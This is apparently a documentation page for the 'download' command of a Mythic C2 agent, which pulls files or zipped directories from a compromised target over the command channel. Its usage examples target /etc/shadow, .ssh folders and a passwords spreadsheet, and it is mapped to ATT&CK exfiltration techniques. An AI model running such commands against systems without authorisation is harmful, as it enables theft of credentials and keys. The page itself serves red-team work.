+++
title = "download"
chapter = false
weight = 103
hidden = false
+++

## Summary

Download a file or directory from the target system. Supports chunked file transfer for any file size. Integrates with the Mythic file browser.

When given a directory path, the command automatically creates a zip archive of the directory contents and downloads it. The zip file is created in a temp location and cleaned up after transfer.

### Arguments

#### path
Path to the file or directory to download.

## Usage
```
download [path]
```

### Download a single file
```
download C:\Users\admin\Documents\passwords.xlsx
download /etc/shadow
```

### Download an entire directory
```
download C:\Users\target\Documents
download /home/user/.ssh
```
The directory will be downloaded as `Documents.zip` or `.ssh.zip` respectively.

## Directory Download Details

- Recursively zips all files up to 10 levels deep
- Skips inaccessible files (no errors, silently omitted)
- Skips symlinks for safety
- Zip uses Deflate compression
- Temp zip is automatically removed after transfer
- Output includes file count and compression stats

## MITRE ATT&CK Mapping

- **T1020** — Automated Exfiltration
- **T1030** — Data Transfer Size Limits
- **T1041** — Exfiltration Over C2 Channel
- **T1560.002** — Archive Collected Data: Archive via Library
